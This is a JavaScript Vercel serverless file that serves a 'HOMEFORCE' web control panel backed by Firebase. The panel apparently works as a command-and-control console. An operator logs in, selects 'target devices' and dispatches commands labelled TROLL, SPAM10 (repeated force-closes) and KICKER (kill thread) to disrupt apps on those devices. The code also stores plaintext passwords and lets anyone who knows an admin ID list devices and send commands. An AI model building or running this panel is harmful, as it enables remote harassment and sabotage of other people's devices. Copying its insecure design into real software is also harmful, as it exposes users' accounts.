// language: JavaScript, file: api/index.js, target: Vercel Serverless Single-File
export default async function handler(req, res) {
  const FIREBASE_URL = process.env.FIREBASE_URL;

  // 1. JIKA ADA REQUEST ACTION DARI FRONTEND (BACKEND PROXY)
  if (req.method === 'POST') {
    const { action, username, password, adminId, deviceId, command } = req.body;

    if (!FIREBASE_URL) {
      return res.status(500).json({ error: 'ENV FIREBASE_URL MISSING IN VERCEL' });
    }

    try {
      if (action === 'login') {
        const dbRes = await fetch(`${FIREBASE_URL}/admins.json`);
        const data = await dbRes.json();
        let found = null;
        if (data) {
          for (const [id, val] of Object.entries(data)) {
            if (val.auth && val.auth.username === username && val.auth.password === password) {
              found = id; break;
            }
          }
        }
        return res.status(found ? 200 : 401).json({ success: !!found, adminId: found });
      }

      if (action === 'get_devices') {
        const dbRes = await fetch(`${FIREBASE_URL}/admins/${adminId}/devices.json`);
        const devices = await dbRes.json();
        return res.status(200).json({ success: true, devices: devices || {} });
      }

      if (action === 'send_command') {
        await fetch(`${FIREBASE_URL}/admins/${adminId}/devices/${deviceId}/command.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(command)
        });
        return res.status(200).json({ success: true });
      }

      if (action === 'purge_command') {
        await fetch(`${FIREBASE_URL}/admins/${adminId}/devices/${deviceId}/command.json`, { method: 'DELETE' });
        return res.status(200).json({ success: true });
      }
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  // 2. JIKA DIAKSES BIASA VIA BROWSER (SERVE SINGLE-FILE HTML UI)
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HOMEFORCE // CONTROL MATRIX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800;900&family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #05020a;
            --card-bg: rgba(15, 7, 28, 0.85);
            --border-purple: rgba(168, 85, 247, 0.25);
            --accent-violet: #a855f7;
            --accent-magenta: #d946ef;
            --accent-fuchsia: #f0abfc;
            --accent-crimson: #ff0055;
            --accent-emerald: #00ff9d;
            --text-primary: #fae8ff;
            --text-secondary: #c084fc;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Space Grotesk', sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; }
        html, body { width: 100vw; height: 100vh; overflow: hidden; background: var(--bg-deep); color: var(--text-primary); }
        body { display: flex; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at 50% -20%, rgba(168, 85, 247, 0.25) 0%, transparent 60%); }
        .container { width: 100%; height: 100%; background: var(--card-bg); backdrop-filter: blur(30px); padding: 24px; display: flex; flex-direction: column; justify-content: space-between; }
        @media (min-width: 768px) { .container { max-width: 480px; height: 92vh; border-radius: 24px; border: 1px solid var(--border-purple); box-shadow: 0 0 50px rgba(168, 85, 247, 0.25); } }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 16px; border-bottom: 1px solid var(--border-purple); }
        .brand-text { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.1rem; background: linear-gradient(180deg, #ffffff, var(--accent-fuchsia)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hidden { display: none !important; }
        .input-field { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border-purple); background: #000; color: #fff; font-family: 'JetBrains Mono', monospace; outline: none; margin-bottom: 12px; }
        .btn-main { width: 100%; padding: 14px; border-radius: 10px; border: none; background: linear-gradient(135deg, var(--accent-violet), var(--accent-magenta)); color: #fff; font-family: 'Orbitron', sans-serif; font-weight: 800; cursor: pointer; }
        .device-tab-box { display: flex; flex-direction: column; gap: 8px; margin: 12px 0; }
        .device-list { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 6px; }
        .device-chip { padding: 10px 14px; border-radius: 10px; border: 1px solid var(--border-purple); background: rgba(20, 10, 36, 0.6); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; cursor: pointer; white-space: nowrap; flex-shrink: 0; }
        .device-chip.active { border-color: var(--accent-magenta); background: rgba(217, 70, 239, 0.2); color: #fff; }
        .command-stack { display: flex; flex-direction: column; gap: 12px; }
        .btn-cmd { padding: 16px; border-radius: 12px; border: 1px solid var(--border-purple); background: rgba(20, 10, 36, 0.6); color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        .btn-kicker { border-color: rgba(255, 0, 85, 0.4); }
        .console-box { background: rgba(5, 2, 10, 0.9); border: 1px solid var(--border-purple); border-radius: 10px; padding: 14px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; min-height: 70px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="brand-text">HOMEFORCE</div>
            <div id="adminBadge" style="font-family: Orbitron; font-size: 0.7rem; color: var(--accent-fuchsia);">UNAUTHENTICATED</div>
        </div>

        <div id="loginSection" style="margin: auto 0;">
            <input type="text" id="authUser" class="input-field" placeholder="Admin Username">
            <input type="password" id="authPass" class="input-field" placeholder="Admin Password">
            <button class="btn-main" onclick="login()">AUTHENTICATE</button>
        </div>

        <div id="controlSection" class="hidden" style="display: flex; flex-direction: column; gap: 14px; flex-grow: 1; justify-content: center;">
            <div class="device-tab-box">
                <div style="font-family: Orbitron; font-size: 0.7rem; color: var(--text-secondary);">SELECT TARGET DEVICE</div>
                <div class="device-list" id="deviceContainer"><div style="color: #666; font-size: 0.75rem;">Scanning...</div></div>
            </div>

            <div class="command-stack">
                <button class="btn-cmd" onclick="dispatchCommand('TROLL')">
                    <span style="font-family: Orbitron; font-weight: 800;">TROLL</span>
                    <span style="font-family: Orbitron; font-size: 0.7rem; color: var(--accent-fuchsia);">3x FORCE CLOSE</span>
                </button>
                <button class="btn-cmd" onclick="dispatchCommand('SPAM10')">
                    <span style="font-family: Orbitron; font-weight: 800;">SPAM10</span>
                    <span style="font-family: Orbitron; font-size: 0.7rem; color: var(--accent-fuchsia);">10x FORCE CLOSE</span>
                </button>
                <button class="btn-cmd btn-kicker" onclick="dispatchCommand('KICKER')">
                    <span style="font-family: Orbitron; font-weight: 800;">KICKER</span>
                    <span style="font-family: Orbitron; font-size: 0.7rem; color: var(--accent-crimson);">KILL THREAD</span>
                </button>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <button class="btn-main" style="background: rgba(20, 10, 36, 0.8); border: 1px solid var(--border-purple); font-size: 0.7rem;" onclick="refreshDevices()">REFRESH DEVICES</button>
                <button class="btn-main" style="background: rgba(255, 0, 85, 0.2); border: 1px solid var(--accent-crimson); font-size: 0.7rem; color: var(--accent-crimson);" onclick="purgeCommand()">PURGE TARGET</button>
            </div>
        </div>

        <div class="console-box">
            <div style="color: var(--text-secondary); font-size: 0.6rem; margin-bottom: 4px;">SYS // LOG</div>
            <div id="logText" style="color: var(--accent-fuchsia);">AWAITING LOGIN...</div>
        </div>
    </div>

    <script>
        let currentAdminId = null;
        let selectedDeviceId = null;

        function printLog(msg, isErr = false) {
            const el = document.getElementById("logText");
            el.style.color = isErr ? "var(--accent-crimson)" : "var(--accent-fuchsia)";
            el.innerText = '>> ' + msg;
        }

        async function login() {
            const u = document.getElementById("authUser").value.trim();
            const p = document.getElementById("authPass").value.trim();
            if (!u || !p) return printLog("ENTER CREDENTIALS", true);

            printLog("AUTHENTICATING...");
            try {
                const res = await fetch('/api', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'login', username: u, password: p })
                });
                const data = await res.json();
                if (data.success) {
                    currentAdminId = data.adminId;
                    document.getElementById("loginSection").classList.add("hidden");
                    document.getElementById("controlSection").classList.remove("hidden");
                    document.getElementById("adminBadge").innerText = currentAdminId;
                    printLog('AUTH_SUCCESS // ID: ' + currentAdminId);
                    refreshDevices();
                } else {
                    printLog("AUTHENTICATION FAILED", true);
                }
            } catch (e) { printLog('ERR: ' + e.message, true); }
        }

        async function refreshDevices() {
            if (!currentAdminId) return;
            printLog("SCANNING DEVICES...");
            const container = document.getElementById("deviceContainer");
            container.innerHTML = "";

            try {
                const res = await fetch('/api', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'get_devices', adminId: currentAdminId })
                });
                const data = await res.json();
                if (!data.devices || Object.keys(data.devices).length === 0) {
                    container.innerHTML = '<div style="color:#888; font-size:0.75rem;">No active devices found.</div>';
                    selectedDeviceId = null;
                    return;
                }

                let first = true;
                for (const [devId, info] of Object.entries(data.devices)) {
                    const name = info.info ? info.info.name : devId;
                    const chip = document.createElement("div");
                    chip.className = 'device-chip ' + (first ? 'active' : '');
                    chip.innerText = name;
                    chip.onclick = () => selectDevice(devId, chip);
                    container.appendChild(chip);
                    if (first) { selectedDeviceId = devId; first = false; }
                }
                printLog('SCAN COMPLETE (' + Object.keys(data.devices).length + ' ONLINE)');
            } catch (e) { printLog('SCAN ERR: ' + e.message, true); }
        }

        function selectDevice(devId, element) {
            document.querySelectorAll(".device-chip").forEach(el => el.classList.remove("active"));
            element.classList.add("active");
            selectedDeviceId = devId;
            printLog('TARGET LOCKED: ' + devId);
        }

        async function dispatchCommand(cmd) {
            if (!selectedDeviceId) return printLog("NO DEVICE SELECTED!", true);
            printLog('DISPATCHING ' + cmd + '...');
            try {
                const res = await fetch('/api', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'send_command', adminId: currentAdminId, deviceId: selectedDeviceId, command: cmd })
                });
                const data = await res.json();
                if (data.success) printLog('COMMAND ' + cmd + ' DISPATCHED.');
                else printLog('FAILED: ' + data.error, true);
            } catch (e) { printLog('NET ERR: ' + e.message, true); }
        }

        async function purgeCommand() {
            if (!selectedDeviceId) return printLog("NO DEVICE SELECTED!", true);
            printLog('PURGING TARGET...');
            try {
                const res = await fetch('/api', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'purge_command', adminId: currentAdminId, deviceId: selectedDeviceId })
                });
                const data = await res.json();
                if (data.success) printLog("TARGET COMMAND PURGED.");
            } catch (e) { printLog('NET ERR: ' + e.message, true); }
        }
    </script>
</body>
</html>
  `);
}
